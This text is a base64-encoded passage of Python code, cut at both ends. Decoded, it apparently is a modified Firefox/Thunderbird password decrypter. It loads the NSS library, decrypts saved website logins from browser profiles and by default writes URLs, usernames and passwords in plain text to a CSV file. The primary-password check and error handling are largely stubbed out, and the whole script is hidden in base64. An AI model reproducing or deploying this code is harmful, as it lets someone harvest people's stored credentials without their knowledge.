W9ucyA9IFsKICAgICAgICAgICAgICAgICIiLCAgIyBDdXJyZW50IGRpcmVjdG9
yeSBvciBzeXN0ZW0gbGliIGZpbmRlcgogICAgICAgICAgICAgICAgIkM6XFxQcm9ncmFtIEZpbGVzICh4ODYpXFxNb3ppbGxhIEZpcmVmb3giLAogICAgICAgICAgICAgICAgIkM6XFxQcm9ncmFtIEZpbGVzICh4ODYpXFxGaXJlZm94IERldmVsb3BlciBFZGl0aW9uIiwKICAgICAgICAgICAgICAgICJDOlxcUHJvZ3JhbSBGaWxlcyAoeDg2KVxcTW96aWxsYSBUaHVuZGVyYmlyZCIsCiAgICAgICAgICAgICAgICAiQzpcXFByb2dyYW0gRmlsZXMgKHg4NilcXE5pZ2h0bHkiLAogICAgICAgICAgICAgICAgIkM6XFxQcm9ncmFtIEZpbGVzICh4ODYpXFxTZWFNb25rZXkiLAogICAgICAgICAgICAgICAgIkM6XFxQcm9ncmFtIEZpbGVzICh4ODYpXFxXYXRlcmZveCIsCiAgICAgICAgICAgIF0gKyBsb2NhdGlvbnMKCiAgICAgICAgIyBJZiBlaXRoZXIgb2YgdGhlIHN1cHBvcnRlZCBzb2Z0d2FyZSBpcyBpbiBQQVRIIHRyeSB0byB1c2UgaXQKICAgICAgICBzb2Z0d2FyZSA9IFsiZmlyZWZveCIsICJ0aHVuZGVyYmlyZCIsICJ3YXRlcmZveCIsICJzZWFtb25rZXkiXQogICAgICAgIGZvciBiaW5hcnkgaW4gc29mdHdhcmU6CiAgICAgICAgICAgIGxvY2F0aW9uOiBPcHRpb25hbFtzdHJdID0gc2h1dGlsLndoaWNoKGJpbmFyeSkKICAgICAgICAgICAgaWYgbG9jYXRpb24gaXMgbm90IE5vbmU6CiAgICAgICAgICAgICAgICBuc3Nsb2NhdGlvbjogc3RyID0gb3MucGF0aC5qb2luKG9zLnBhdGguZGlybmFtZShsb2NhdGlvbiksIG5zc25hbWUpCiAgICAgICAgICAgICAgICBsb2NhdGlvbnMuYXBwZW5kKG5zc2xvY2F0aW9uKQoKICAgIGVsaWYgU1lTVEVNID09ICJEYXJ3aW4iOgogICAgICAgIG5zc25hbWUgPSAibGlibnNzMy5keWxpYiIKICAgICAgICBsb2NhdGlvbnMgPSAoCiAgICAgICAgICAgICIiLCAgIyBDdXJyZW50IGRpcmVjdG9yeSBvciBzeXN0ZW0gbGliIGZpbmRlcgogICAgICAgICAgICAiL3Vzci9sb2NhbC9saWIvbnNzIiwKICAgICAgICAgICAgIi91c3IvbG9jYWwvbGliIiwKICAgICAgICAgICAgIi9vcHQvbG9jYWwvbGliL25zcyIsCiAgICAgICAgICAgICIvc3cvbGliL2ZpcmVmb3giLAogICAgICAgICAgICAiL3N3L2xpYi9tb3ppbGxhIiwKICAgICAgICAgICAgIi91c3IvbG9jYWwvb3B0L25zcy9saWIiLCAgIyBuc3MgaW5zdGFsbGVkIHdpdGggQnJldyBvbiBEYXJ3aW4KICAgICAgICAgICAgIi9vcHQvcGtnL2xpYi9uc3MiLCAgIyBpbnN0YWxsZWQgdmlhIHBrZ3NyYwogICAgICAgICAgICAiL0FwcGxpY2F0aW9ucy9GaXJlZm94LmFwcC9Db250ZW50cy9NYWNPUyIsICAjIGRlZmF1bHQgbWFudWFsIGluc3RhbGwgbG9jYXRpb24KICAgICAgICAgICAgIi9BcHBsaWNhdGlvbnMvVGh1bmRlcmJpcmQuYXBwL0NvbnRlbnRzL01hY09TIiwKICAgICAgICAgICAgIi9BcHBsaWNhdGlvbnMvU2VhTW9ua2V5LmFwcC9Db250ZW50cy9NYWNPUyIsCiAgICAgICAgICAgICIvQXBwbGljYXRpb25zL1dhdGVyZm94LmFwcC9Db250ZW50cy9NYWNPUyIsCiAgICAgICAgKQoKICAgIGVsc2U6CiAgICAgICAgbnNzbmFtZSA9ICJsaWJuc3MzLnNvIgogICAgICAgIGlmIFNZUzY0OgogICAgICAgICAgICBsb2NhdGlvbnMgPSAoCiAgICAgICAgICAgICAgICAiIiwgICMgQ3VycmVudCBkaXJlY3Rvcnkgb3Igc3lzdGVtIGxpYiBmaW5kZXIKICAgICAgICAgICAgICAgICIvdXNyL2xpYjY0IiwKICAgICAgICAgICAgICAgICIvdXNyL2xpYjY0L25zcyIsCiAgICAgICAgICAgICAgICAiL3Vzci9saWIiLAogICAgICAgICAgICAgICAgIi91c3IvbGliL25zcyIsCiAgICAgICAgICAgICAgICAiL3Vzci9sb2NhbC9saWIiLAogICAgICAgICAgICAgICAgIi91c3IvbG9jYWwvbGliL25zcyIsCiAgICAgICAgICAgICAgICAiL29wdC9sb2NhbC9saWIiLAogICAgICAgICAgICAgICAgIi9vcHQvbG9jYWwvbGliL25zcyIsCiAgICAgICAgICAgICAgICBvcy5wYXRoLmV4cGFuZHVzZXIoIn4vLm5peC1wcm9maWxlL2xpYiIpLAogICAgICAgICAgICApCiAgICAgICAgZWxzZToKICAgICAgICAgICAgbG9jYXRpb25zID0gKAogICAgICAgICAgICAgICAgIiIsICAjIEN1cnJlbnQgZGlyZWN0b3J5IG9yIHN5c3RlbSBsaWIgZmluZGVyCiAgICAgICAgICAgICAgICAiL3Vzci9saWIiLAogICAgICAgICAgICAgICAgIi91c3IvbGliL25zcyIsCiAgICAgICAgICAgICAgICAiL3Vzci9saWIzMiIsCiAgICAgICAgICAgICAgICAiL3Vzci9saWIzMi9uc3MiLAogICAgICAgICAgICAgICAgIi91c3IvbGliNjQiLAogICAgICAgICAgICAgICAgIi91c3IvbGliNjQvbnNzIiwKICAgICAgICAgICAgICAgICIvdXNyL2xvY2FsL2xpYiIsCiAgICAgICAgICAgICAgICAiL3Vzci9sb2NhbC9saWIvbnNzIiwKICAgICAgICAgICAgICAgICIvb3B0L2xvY2FsL2xpYiIsCiAgICAgICAgICAgICAgICAiL29wdC9sb2NhbC9saWIvbnNzIiwKICAgICAgICAgICAgICAgIG9zLnBhdGguZXhwYW5kdXNlcigifi8ubml4LXByb2ZpbGUvbGliIiksCiAgICAgICAgICAgICkKCiAgICAjIElmIHRoaXMgc3VjY2VlZHMgbGlibnNzIHdhcyBsb2FkZWQKICAgIHJldHVybiBmaW5kX25zcyhsb2NhdGlvbnMsIG5zc25hbWUpCgoKY2xhc3MgY19jaGFyX3BfZnJvbXN0cihjdC5jX2NoYXJfcCk6CiAgICAiIiJjdHlwZXMgY2hhcl9wIG92ZXJyaWRlIHRoYXQgaGFuZGxlcyBlbmNvZGluZyBzdHIgdG8gYnl0ZXMiIiIKCiAgICBkZWYgZnJvbV9wYXJhbShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5lbmNvZGUoREVGQVVMVF9FTkNPRElORykKCgpjbGFzcyBOU1NQcm94eToKICAgIGNsYXNzIFNFQ0l0ZW0oY3QuU3RydWN0dXJlKToKICAgICAgICAiIiJzdHJ1Y3QgbmVlZGVkIHRvIGludGVyYWN0IHdpdGggbGlibnNzIiIiCgogICAgICAgIF9maWVsZHNfID0gWwogICAgICAgICAgICAoInR5cGUiLCBjdC5jX3VpbnQpLAogICAgICAgICAgICAoImRhdGEiLCBjdC5jX2NoYXJfcCksICAjIGFjdHVhbGx5OiB1bnNpZ25lZCBjaGFyICoKICAgICAgICAgICAgKCJsZW4iLCBjdC5jX3VpbnQpLAogICAgICAgIF0KCiAgICAgICAgZGVmIGRlY29kZV9kYXRhKHNlbGYpOgogICAgICAgICAgICBfYnl0ZXMgPSBjdC5zdHJpbmdfYXQoc2VsZi5kYXRhLCBzZWxmLmxlbikKICAgICAgICAgICAgcmV0dXJuIF9ieXRlcy5kZWNvZGUoREVGQVVMVF9FTkNPRElORykKCiAgICBjbGFzcyBQSzExU2xvdEluZm8oY3QuU3RydWN0dXJlKToKICAgICAgICAiIiJPcGFxdWUgc3RydWN0dXJlIHJlcHJlc2VudGluZyBhIGxvZ2ljYWwgUEtDUyBzbG90IiIiCgogICAgZGVmIF9faW5pdF9fKHNlbGYsIG5vbl9mYXRhbF9kZWNyeXB0aW9uPUZhbHNlKToKICAgICAgICAjIExvY2F0ZSBsaWJuc3MgYW5kIHRyeSBsb2FkaW5nIGl0CiAgICAgICAgc2VsZi5saWJuc3MgPSBsb2FkX2xpYm5zcygpCiAgICAgICAgc2VsZi5ub25fZmF0YWxfZGVjcnlwdGlvbiA9IG5vbl9mYXRhbF9kZWNyeXB0aW9uCgogICAgICAgIFNsb3RJbmZvUHRyID0gY3QuUE9JTlRFUihzZWxmLlBLMTFTbG90SW5mbykKICAgICAgICBTRUNJdGVtUHRyID0gY3QuUE9JTlRFUihzZWxmLlNFQ0l0ZW0pCgogICAgICAgIHNlbGYuX3NldF9jdHlwZXMoY3QuY19pbnQsICJOU1NfSW5pdCIsIGNfY2hhcl9wX2Zyb21zdHIpCiAgICAgICAgc2VsZi5fc2V0X2N0eXBlcyhjdC5jX2ludCwgIk5TU19TaHV0ZG93biIpCiAgICAgICAgc2VsZi5fc2V0X2N0eXBlcyhTbG90SW5mb1B0ciwgIlBLMTFfR2V0SW50ZXJuYWxLZXlTbG90IikKICAgICAgICBzZWxmLl9zZXRfY3R5cGVzKE5vbmUsICJQSzExX0ZyZWVTbG90IiwgU2xvdEluZm9QdHIpCiAgICAgICAgc2VsZi5fc2V0X2N0eXBlcyhjdC5jX2ludCwgIlBLMTFfTmVlZExvZ2luIiwgU2xvdEluZm9QdHIpCiAgICAgICAgc2VsZi5fc2V0X2N0eXBlcygKICAgICAgICAgICAgY3QuY19pbnQsICJQSzExX0NoZWNrVXNlclBhc3N3b3JkIiwgU2xvdEluZm9QdHIsIGNfY2hhcl9wX2Zyb21zdHIKICAgICAgICApCiAgICAgICAgc2VsZi5fc2V0X2N0eXBlcygKICAgICAgICAgICAgY3QuY19pbnQsICJQSzExU0RSX0RlY3J5cHQiLCBTRUNJdGVtUHRyLCBTRUNJdGVtUHRyLCBjdC5jX3ZvaWRfcAogICAgICAgICkKICAgICAgICBzZWxmLl9zZXRfY3R5cGVzKE5vbmUsICJTRUNJVEVNX1pmcmVlSXRlbSIsIFNFQ0l0ZW1QdHIsIGN0LmNfaW50KQoKICAgICAgICAjIGZvciBlcnJvciBoYW5kbGluZwogICAgICAgIHNlbGYuX3NldF9jdHlwZXMoY3QuY19pbnQsICJQT1JUX0dldEVycm9yIikKICAgICAgICBzZWxmLl9zZXRfY3R5cGVzKGN0LmNfY2hhcl9wLCAiUFJfRXJyb3JUb05hbWUiLCBjdC5jX2ludCkKICAgICAgICBzZWxmLl9zZXRfY3R5cGVzKGN0LmNfY2hhcl9wLCAiUFJfRXJyb3JUb1N0cmluZyIsIGN0LmNfaW50LCBjdC5jX3VpbnQzMikKCiAgICBkZWYgX3NldF9jdHlwZXMoc2VsZiwgcmVzdHlwZSwgbmFtZSwgKmFyZ3R5cGVzKToKICAgICAgICAiIiJTZXQgaW5wdXQvb3V0cHV0IHR5cGVzIG9uIGxpYm5zcyBDIGZ1bmN0aW9ucyBmb3IgYXV0b21hdGljIHR5cGUgY2FzdGluZyIiIgogICAgICAgIHJlcyA9IGdldGF0dHIoc2VsZi5saWJuc3MsIG5hbWUpCiAgICAgICAgcmVzLmFyZ3R5cGVzID0gYXJndHlwZXMKICAgICAgICByZXMucmVzdHlwZSA9IHJlc3R5cGUKCiAgICAgICAgIyBUcmFuc3BhcmVudGx5IGhhbmRsZSBkZWNvZGluZyB0byBzdHJpbmcgd2hlbiByZXR1cm5pbmcgYSBjX2NoYXJfcAogICAgICAgIGlmIHJlc3R5cGUgPT0gY3QuY19jaGFyX3A6CgogICAgICAgICAgICBkZWYgX2RlY29kZShyZXN1bHQsIGZ1bmMsICphcmdzKToKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICByZXR1cm4gcmVzdWx0LmRlY29kZShERUZBVUxUX0VOQ09ESU5HKQogICAgICAgICAgICAgICAgZXhjZXB0IEF0dHJpYnV0ZUVycm9yOgogICAgICAgICAgICAgICAgICAgIHJldHVybiByZXN1bHQKCiAgICAgICAgICAgIHJlcy5lcnJjaGVjayA9IF9kZWNvZGUKCiAgICAgICAgc2V0YXR0cihzZWxmLCAiXyIgKyBuYW1lLCByZXMpCgogICAgZGVmIGluaXRpYWxpemUoc2VsZiwgcHJvZmlsZTogc3RyKToKICAgICAgICAjIFRoZSBzcWw6IHByZWZpeCBlbnN1cmVzIGNvbXBhdGliaWxpdHkgd2l0aCBib3RoCiAgICAgICAgIyBCZXJrbGV5IERCIChjZXJ0OCkgYW5kIFNxbGl0ZSAoY2VydDkpIGRicwogICAgICAgIHByb2ZpbGVfcGF0aCA9ICJzcWw6IiArIHByb2ZpbGUKCiAgICAgICAgZXJyX3N0YXR1czogaW50ID0gc2VsZi5fTlNTX0luaXQocHJvZmlsZV9wYXRoKQoKICAgIGRlZiBzaHV0ZG93bihzZWxmKToKICAgICAgICBlcnJfc3RhdHVzOiBpbnQgPSBzZWxmLl9OU1NfU2h1dGRvd24oKQoKCiAgICBkZWYgYXV0aGVudGljYXRlKHNlbGYsIHByb2ZpbGUsIGludGVyYWN0aXZlKToKICAgICAgICAiIiJVbmxvY2tzIHRoZSBwcm9maWxlIGlmIG5lY2Vzc2FyeSwgaW4gd2hpY2ggY2FzZSBhIHBhc3N3b3JkCiAgICAgICAgd2lsbCBwcm9tcHRlZCB0byB0aGUgdXNlci4KICAgICAgICAiIiIKICAgICAgICBrZXlzbG90ID0gc2VsZi5fUEsxMV9HZXRJbnRlcm5hbEtleVNsb3QoKQoKCiAgICBkZWYgZGVjcnlwdChzZWxmLCBkYXRhNjQpOgogICAgICAgIGRhdGEgPSBiNjRkZWNvZGUoZGF0YTY0KQogICAgICAgIGlucCA9IHNlbGYuU0VDSXRlbSgwLCBkYXRhLCBsZW4oZGF0YSkpCiAgICAgICAgb3V0ID0gc2VsZi5TRUNJdGVtKDAsIE5vbmUsIDApCgogICAgICAgIGVycl9zdGF0dXM6IGludCA9IHNlbGYuX1BLMTFTRFJfRGVjcnlwdChpbnAsIG91dCwgTm9uZSkKICAgICAgICB0cnk6CiAgICAgICAgICAgIGlmIGVycl9zdGF0dXM6ICAjIC0xIG1lYW5zIHBhc3N3b3JkIGZhaWxlZCwgb3RoZXIgc3RhdHVzIGFyZSB1bmtub3duCiAgICAgICAgICAgICAgICBlcnJvcl9tc2cgPSAoCiAgICAgICAgICAgICAgICAgICAgIlVzZXJuYW1lL1Bhc3N3b3JkIGRlY3J5cHRpb24gZmFpbGVkLiAiCiAgICAgICAgICAgICAgICAgICAgIkNyZWRlbnRpYWxzIGRhbWFnZWQgb3IgY2VydC9rZXkgZmlsZSBtaXNtYXRjaC4iCiAgICAgICAgICAgICAgICApCgogICAgICAgICAgICAgICAgaWYgc2VsZi5ub25fZmF0YWxfZGVjcnlwdGlvbjoKICAgICAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKGVycm9yX21zZykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgc2VsZi5oYW5kbGVfZXJyb3IoRXhpdC5ERUNSWVBUSU9OX0ZBSUxFRCwgZXJyb3JfbXNnKQoKICAgICAgICAgICAgcmVzID0gb3V0LmRlY29kZV9kYXRhKCkKICAgICAgICBmaW5hbGx5OgogICAgICAgICAgICAjIEF2b2lkIGxlYWtpbmcgU0VDSXRlbQogICAgICAgICAgICBzZWxmLl9TRUNJVEVNX1pmcmVlSXRlbShvdXQsIDApCgogICAgICAgIHJldHVybiByZXMKCgpjbGFzcyBNb3ppbGxhSW50ZXJhY3Rpb246CiAgICAiIiIKICAgIEFic3RyYWN0aW9uIGludGVyZmFjZSB0byBNb3ppbGxhIHByb2ZpbGUgYW5kIGxpYiBOU1MKICAgICIiIgoKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBub25fZmF0YWxfZGVjcnlwdGlvbj1GYWxzZSk6CiAgICAgICAgc2VsZi5wcm9maWxlID0gTm9uZQogICAgICAgIHNlbGYucHJveHkgPSBOU1NQcm94eShub25fZmF0YWxfZGVjcnlwdGlvbikKCiAgICBkZWYgbG9hZF9wcm9maWxlKHNlbGYsIHByb2ZpbGUpOgogICAgICAgICIiIkluaXRpYWxpemUgdGhlIE5TUyBsaWJyYXJ5IGFuZCBwcm9maWxlIiIiCiAgICAgICAgc2VsZi5wcm9maWxlID0gcHJvZmlsZQogICAgICAgIHNlbGYucHJveHkuaW5pdGlhbGl6ZShzZWxmLnByb2ZpbGUpCgogICAgZGVmIGF1dGhlbnRpY2F0ZShzZWxmLCBpbnRlcmFjdGl2ZSk6CiAgICAgICAgIiIiQXV0aGVudGljYXRlIHRoZSB0aGUgY3VycmVudCBwcm9maWxlIGlzIHByb3RlY3RlZCBieSBhIHByaW1hcnkgcGFzc3dvcmQsCiAgICAgICAgcHJvbXB0IHRoZSB1c2VyIGFuZCB1bmxvY2sgdGhlIHByb2ZpbGUuCiAgICAgICAgIiIiCiAgICAgICAgc2VsZi5wcm94eS5hdXRoZW50aWNhdGUoc2VsZi5wcm9maWxlLCBpbnRlcmFjdGl2ZSkKCiAgICBkZWYgdW5sb2FkX3Byb2ZpbGUoc2VsZik6CiAgICAgICAgIiIiU2h1dGRvd24gTlNTIGFuZCBkZWFjdGl2YXRlIGN1cnJlbnQgcHJvZmlsZSIiIgogICAgICAgIHNlbGYucHJveHkuc2h1dGRvd24oKQoKICAgIGRlZiBkZWNyeXB0X3Bhc3N3b3JkcyhzZWxmKSAtPiBQV1N0b3JlOgogICAgICAgICIiIkRlY3J5cHQgcmVxdWVzdGVkIHByb2ZpbGUgdXNpbmcgdGhlIHByb3ZpZGVkIHBhc3N3b3JkLgogICAgICAgIFJldHVybnMgYWxsIHBhc3N3b3JkcyBpbiBhIGxpc3Qgb2YgZGljdHMKICAgICAgICAiIiIKICAgICAgICBjcmVkZW50aWFsczogQ3JlZGVudGlhbHMgPSBzZWxmLm9idGFpbl9jcmVkZW50aWFscygpCgogICAgICAgIG91dHB1dHM6IFBXU3RvcmUgPSBbXQoKICAgICAgICB1cmw6IHN0cgogICAgICAgIHVzZXI6IHN0cgogICAgICAgIHBhc3N3OiBzdHIKICAgICAgICBlbmN0eXBlOiBpbnQKICAgICAgICBpZihjcmVkZW50aWFscyk6CiAgICAgICAgICAgIGZvciB1cmwsIHVzZXIsIHBhc3N3LCBlbmN0eXBlIGluIGNyZWRlbnRpYWxzOgogICAgICAgICAgICAgICAgaWYgZW5jdHlwZToKICAgICAg
ICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIHVzZXIgPSBzZWxmLnByb3h5LmRlY3J5cHQodXNlcikKICAgICAgICAgICAgICAgICAgICAgICAgcGFzc3cgPSBzZWxmLnByb3h5LmRlY3J5cHQocGFzc3cpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IChUeXBlRXJyb3IsIFZhbHVlRXJyb3IpIGFzIGU6CiAgICAgICAgICAgICAgICAgICAgICAgIE5vbmUKCiAgICAgICAgICAgICAgICBvdXRwdXQgPSB7InVybCI6IHVybCwgInVzZXIiOiB1c2VyLCAicGFzc3dvcmQiOiBwYXNzd30KICAgICAgICAgICAgICAgIG91dHB1dHMuYXBwZW5kKG91dHB1dCkKCiAgICAgICAgICAgIGNyZWRlbnRpYWxzLmRvbmUoKQoKICAgICAgICByZXR1cm4gb3V0cHV0cwoKICAgIGRlZiBvYnRhaW5fY3JlZGVudGlhbHMoc2VsZikgLT4gQ3JlZGVudGlhbHM6CiAgICAgICAgIiIiRmlndXJlIG91dCB3aGljaCBvZiB0aGUgMiBwb3NzaWJsZSBiYWNrZW5kIGNyZWRlbnRpYWwgZW5naW5lcyBpcyBhdmFpbGFibGUiIiIKICAgICAgICBjcmVkZW50aWFsczogQ3JlZGVudGlhbHMKICAgICAgICB0cnk6CiAgICAgICAgICAgIGNyZWRlbnRpYWxzID0gSnNvbkNyZWRlbnRpYWxzKHNlbGYucHJvZmlsZSkKICAgICAgICBleGNlcHQgTm90Rm91bmRFcnJvcjoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgY3JlZGVudGlhbHMgPSBTcWxpdGVDcmVkZW50aWFscyhzZWxmLnByb2ZpbGUpCiAgICAgICAgICAgIGV4Y2VwdCBOb3RGb3VuZEVycm9yOgogICAgICAgICAgICAgICAgcmV0dXJuIE5vbmUKCiAgICAgICAgcmV0dXJuIGNyZWRlbnRpYWxzCgpjbGFzcyBPdXRwdXRGb3JtYXQ6CiAgICBkZWYgX19pbml0X18oc2VsZiwgcHdzdG9yZTogUFdTdG9yZSwgY21kYXJnczogYXJncGFyc2UuTmFtZXNwYWNlKToKICAgICAgICBzZWxmLnB3c3RvcmUgPSBwd3N0b3JlCiAgICAgICAgc2VsZi5jbWRhcmdzID0gY21kYXJncwoKICAgIGRlZiBvdXRwdXQoc2VsZik6CiAgICAgICAgcGFzcwoKCmNsYXNzIEh1bWFuT3V0cHV0Rm9ybWF0KE91dHB1dEZvcm1hdCk6CiAgICBkZWYgb3V0cHV0KHNlbGYpOgogICAgICAgIGZvciBvdXRwdXQgaW4gc2VsZi5wd3N0b3JlOgogICAgICAgICAgICByZWNvcmQ6IHN0ciA9ICgKICAgICAgICAgICAgICAgIGYiXG5XZWJzaXRlOiAgIHtvdXRwdXRbJ3VybCddfVxuIgogICAgICAgICAgICAgICAgZiJVc2VybmFtZTogJ3tvdXRwdXRbJ3VzZXInXX0nXG4iCiAgICAgICAgICAgICAgICBmIlBhc3N3b3JkOiAne291dHB1dFsncGFzc3dvcmQnXX0nXG4iCiAgICAgICAgICAgICkKICAgICAgICAgICAgc3lzLnN0ZG91dC53cml0ZShyZWNvcmQpCgoKY2xhc3MgQ1NWT3V0cHV0Rm9ybWF0KE91dHB1dEZvcm1hdCk6CiAgICBkZWYgX19pbml0X18oc2VsZiwgcHdzdG9yZTogUFdTdG9yZSwgY21kYXJnczogYXJncGFyc2UuTmFtZXNwYWNlKToKICAgICAgICBzdXBlcigpLl9faW5pdF9fKHB3c3RvcmUsIGNtZGFyZ3MpCiAgICAgICAgc2VsZi5kZWxpbWl0ZXIgPSBjbWRhcmdzLmNzdl9kZWxpbWl0ZXIKICAgICAgICBzZWxmLnF1b3RlY2hhciA9IGNtZGFyZ3MuY3N2X3F1b3RlY2hhcgogICAgICAgIHNlbGYuaGVhZGVyID0gY21kYXJncy5jc3ZfaGVhZGVyCgogICAgZGVmIG91dHB1dChzZWxmKToKICAgICAgICB3aXRoIG9wZW4oJ2ZpcmVmb3hfcGFzc3dvcmRzLmNzdicsICd3JywgbmV3bGluZT0nJykgYXMgY3N2ZmlsZToKICAgICAgICAgICAgY3N2X3dyaXRlciA9IGNzdi5EaWN0V3JpdGVyKAogICAgICAgICAgICAgICAgY3N2ZmlsZSwKICAgICAgICAgICAgICAgIGZpZWxkbmFtZXM9WyJ1cmwiLCAidXNlciIsICJwYXNzd29yZCJdLAogICAgICAgICAgICAgICAgbGluZXRlcm1pbmF0b3I9IlxuIiwKICAgICAgICAgICAgICAgIGRlbGltaXRlcj1zZWxmLmRlbGltaXRlciwKICAgICAgICAgICAgICAgIHF1b3RlY2hhcj1zZWxmLnF1b3RlY2hhciwKICAgICAgICAgICAgICAgIHF1b3Rpbmc9Y3N2LlFVT1RFX0FMTCwKICAgICAgICAgICAgKQogICAgICAgICAgICBpZiBzZWxmLmhlYWRlcjoKICAgICAgICAgICAgICAgIGNzdl93cml0ZXIud3JpdGVoZWFkZXIoKQoKICAgICAgICAgICAgZm9yIG91dHB1dCBpbiBzZWxmLnB3c3RvcmU6CiAgICAgICAgICAgICAgICBjc3Zfd3JpdGVyLndyaXRlcm93KG91dHB1dCkKCgpkZWYgZ2V0X3NlY3Rpb25zKHByb2ZpbGVzKToKICAgICIiIgogICAgUmV0dXJucyBoYXNoIG9mIHByb2ZpbGUgbnVtYmVycyBhbmQgcHJvZmlsZSBuYW1lcy4KICAgICIiIgogICAgc2VjdGlvbnMgPSB7fQogICAgaSA9IDEKICAgIGZvciBzZWN0aW9uIGluIHByb2ZpbGVzLnNlY3Rpb25zKCk6CiAgICAgICAgaWYgc2VjdGlvbi5zdGFydHN3aXRoKCJQcm9maWxlIik6CiAgICAgICAgICAgIHNlY3Rpb25zW3N0cihpKV0gPSBwcm9maWxlcy5nZXQoc2VjdGlvbiwgIlBhdGgiKQogICAgICAgICAgICBpICs9IDEKICAgICAgICBlbHNlOgogICAgICAgICAgICBjb250aW51ZQogICAgcmV0dXJuIHNlY3Rpb25zCgoKZGVmIHByaW50X3NlY3Rpb25zKHNlY3Rpb25zLCB0ZXh0SU9XcmFwcGVyPXN5cy5zdGRlcnIpOgogICAgIiIiCiAgICBQcmludHMgYWxsIGF2YWlsYWJsZSBzZWN0aW9ucyB0byBhbiB0ZXh0SU9XcmFwcGVyIChkZWZhdWx0cyB0byBzeXMuc3RkZXJyKQogICAgIiIiCiAgICBmb3IgaSBpbiBzb3J0ZWQoc2VjdGlvbnMpOgogICAgICAgIHRleHRJT1dyYXBwZXIud3JpdGUoZiJ7aX0gLT4ge3NlY3Rpb25zW2ldfVxuIikKICAgIHRleHRJT1dyYXBwZXIuZmx1c2goKQoKCgpkZWYgcmVhZF9wcm9maWxlcyhiYXNlcGF0aCk6CiAgICAiIiIKICAgIFBhcnNlIEZpcmVmb3ggcHJvZmlsZXMgaW4gcHJvdmlkZWQgbG9jYXRpb24uCiAgICBJZiBsaXN0X3Byb2ZpbGVzIGlzIHRydWUsIHdpbGwgZXhpdCBhZnRlciBsaXN0aW5nIGF2YWlsYWJsZSBwcm9maWxlcy4KICAgICIiIgogICAgcHJvZmlsZWluaSA9IG9zLnBhdGguam9pbihiYXNlcGF0aCwgInByb2ZpbGVzLmluaSIpCgogICAgcHJvZmlsZXMgPSBDb25maWdQYXJzZXIoKQogICAgcHJvZmlsZXMucmVhZChwcm9maWxlaW5pLCBlbmNvZGluZz1ERUZBVUxUX0VOQ09ESU5HKQoKICAgIHJldHVybiBwcm9maWxlcwogICAgICAgIAoKCiMgRnJvbSBodHRwczovL2J1Z3MucHl0aG9uLm9yZy9tc2czMjM2ODEKY2xhc3MgQ29udmVydENob2ljZXMoYXJncGFyc2UuQWN0aW9uKToKICAgICIiIkFyZ3BhcnNlIGFjdGlvbiB0aGF0IGludGVycHJldHMgdGhlIGBjaG9pY2VzYCBhcmd1bWVudCBhcyBhIGRpY3QKICAgIG1hcHBpbmcgdGhlIHVzZXItc3BlY2lmaWVkIGNob2ljZXMgdmFsdWVzIHRvIHRoZSByZXN1bHRpbmcgb3B0aW9uCiAgICB2YWx1ZXMuCiAgICAiIiIKCiAgICBkZWYgX19pbml0X18oc2VsZiwgKmFyZ3MsIGNob2ljZXMsICoqa3dhcmdzKToKICAgICAgICBzdXBlcigpLl9faW5pdF9fKCphcmdzLCBjaG9pY2VzPWNob2ljZXMua2V5cygpLCAqKmt3YXJncykKICAgICAgICBzZWxmLm1hcHBpbmcgPSBjaG9pY2VzCgogICAgZGVmIF9fY2FsbF9fKHNlbGYsIHBhcnNlciwgbmFtZXNwYWNlLCB2YWx1ZSwgb3B0aW9uX3N0cmluZz1Ob25lKToKICAgICAgICBzZXRhdHRyKG5hbWVzcGFjZSwgc2VsZi5kZXN0LCBzZWxmLm1hcHBpbmdbdmFsdWVdKQoKCmRlZiBwYXJzZV9zeXNfYXJncygpIC0+IGFyZ3BhcnNlLk5hbWVzcGFjZToKICAgICIiIlBhcnNlIGNvbW1hbmQgbGluZSBhcmd1bWVudHMiIiIKCiAgICBpZiBTWVNURU0gPT0gIldpbmRvd3MiOgogICAgICAgIHByb2ZpbGVfcGF0aCA9IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJBUFBEQVRBIl0sICJNb3ppbGxhIiwgIkZpcmVmb3giKQogICAgZWxpZiBvcy51bmFtZSgpWzBdID09ICJEYXJ3aW4iOgogICAgICAgIHByb2ZpbGVfcGF0aCA9ICJ+L0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC9GaXJlZm94IgogICAgZWxzZToKICAgICAgICBwcm9maWxlX3BhdGggPSAifi8ubW96aWxsYS9maXJlZm94IgoKICAgIHBhcnNlciA9IGFyZ3BhcnNlLkFyZ3VtZW50UGFyc2VyKAogICAgICAgIGRlc2NyaXB0aW9uPSJBY2Nlc3MgRmlyZWZveC9UaHVuZGVyYmlyZCBwcm9maWxlcyBhbmQgZGVjcnlwdCBleGlzdGluZyBwYXNzd29yZHMiCiAgICApCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KAogICAgICAgICJwcm9maWxlIiwKICAgICAgICBuYXJncz0iPyIsCiAgICAgICAgZGVmYXVsdD1wcm9maWxlX3BhdGgsCiAgICAgICAgaGVscD1mIlBhdGggdG8gcHJvZmlsZSBmb2xkZXIgKGRlZmF1bHQ6IHtwcm9maWxlX3BhdGh9KSIsCiAgICApCgogICAgZm9ybWF0X2Nob2ljZXMgPSB7CiAgICAgICAgImh1bWFuIjogSHVtYW5PdXRwdXRGb3JtYXQsCiAgICAgICAgImNzdiI6IENTVk91dHB1dEZvcm1hdCwKICAgIH0KCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KAogICAgICAgICItZiIsCiAgICAgICAgIi0tZm9ybWF0IiwKICAgICAgICBhY3Rpb249Q29udmVydENob2ljZXMsCiAgICAgICAgY2hvaWNlcz1mb3JtYXRfY2hvaWNlcywKICAgICAgICBkZWZhdWx0PUNTVk91dHB1dEZvcm1hdCwKICAgICAgICBoZWxwPSJGb3JtYXQgZm9yIHRoZSBvdXRwdXQuIiwKICAgICkKICAgIHBhcnNlci5hZGRfYXJndW1lbnQoCiAgICAgICAgIi1kIiwKICAgICAgICAiLS1jc3YtZGVsaW1pdGVyIiwKICAgICAgICBhY3Rpb249InN0b3JlIiwKICA